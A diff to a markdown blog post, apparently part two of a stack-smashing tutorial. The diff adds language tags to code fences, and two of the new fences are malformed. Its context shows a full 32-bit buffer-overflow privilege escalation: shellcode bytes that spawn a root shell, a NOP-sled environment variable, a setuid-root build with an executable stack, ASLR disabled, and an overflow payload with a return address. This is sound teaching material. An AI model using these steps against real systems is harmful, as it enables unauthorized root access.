@@ -10,7 +10,7 @@ This post is part two of a post on [stack smashing].  [Part one] should be read 
 
 I'm going to create a chroot and install a 32-bit debian OS into it.  Why?  Why not!  Weeeeeeeeeeeeeeeeeee
 
-```
+```bash
 $ debootstrap --include=build-essential,gdb,vim \
     --arch i386 stretch /srv/chroot/32 http://ftp.debian.org/debian
 
@@ -23,7 +23,7 @@ Let's look again at our little program:
 
 `cat_pictures.c`
 
-```
+```c
 #include <stdio.h>
 #include <string.h>
 
@@ -57,7 +57,7 @@ I have a binary file on my machine called `shellcode.bin` that mysteriously appe
 
 Let's have a look at it in hex:
 
-```
+```bash
 (32)test@trout:$ hexdump -C shellcode.bin
 00000000  31 c0 31 db 31 c9 99 b0  a4 cd 80 6a 0b 58 51 68  |1.1.1......j.XQh|
 00000010  2f 2f 73 68 68 2f 62 69  6e 89 e3 51 89 e2 53 89  |//shh/bin..Q..S.|
@@ -67,7 +67,7 @@ Let's have a look at it in hex:
 
 And let's get it into an environment variable `SHELLCODE`, prepended with a generous [NOP sled]:
 
-```
+bash``
 (32)test@trout:$ export SHELLCODE=$(perl -e 'print "\x90"x200')$(cat shellcode.bin)
 (32)test@trout:$ echo $SHELLCODE
 111ə̀j
@@ -80,7 +80,7 @@ And let's get it into an environment variable `SHELLCODE`, prepended with a gene
 
 And now we'll compile (ensuring the stack is executable), afterwards changing back to `root` temporarily to change the owner and permissions (including setting the `setuid` bit to make the privilege escalation hack possible).
 
-```
+bash``
 (32)test@trout:$ gcc -o cat_pictures -ggdb3 -z execstack cat_pictures.c
 (32)test@trout:$ exit
 (32)root@trout:# chown root cat_pictures
@@ -102,7 +102,7 @@ After having injected our payload into the `SHELLCODE` environment variable, we 
 
 	`getenv.c`
 
-	```
+	```c
 	#include <stdlib.h>
 	#include <stdio.h>
 
@@ -113,7 +113,7 @@ After having injected our payload into the `SHELLCODE` environment variable, we 
 
 	With ASLR on, we can see how the memory address changes with every invocation:
 
-	```
+	```bash
 	(32)test@trout:$ ./getenv SHELLCODE
 	SHELLCODE -> 0xffb3ed84
 	(32)test@trout:$ ./getenv SHELLCODE
@@ -127,7 +127,7 @@ After having injected our payload into the `SHELLCODE` environment variable, we 
 	```
 	Now, let's turn it off.  Although, not strictly necessary, it means that the memory addresses won't change, which makes the exploit easier.
 
-	```
+	```bash
 	# In a terminal outside of the chroot...
 	$ echo 0 | sudo dd of=/proc/sys/kernel/randomize_va_space
 	0+1 records in
@@ -220,7 +220,7 @@ Now, let's smash the stack with our little payload.  As long as we overwrite the
 
 Remember, Intel processors store bits in little-endian order, so the bytes must be written in reverse:
 
-```
+```bash
 (32)test@trout:$ ./cat_pictures $(perl -e 'print "A"x22 . "\xc7\xdd\xff\xff"')
 
 # whoami
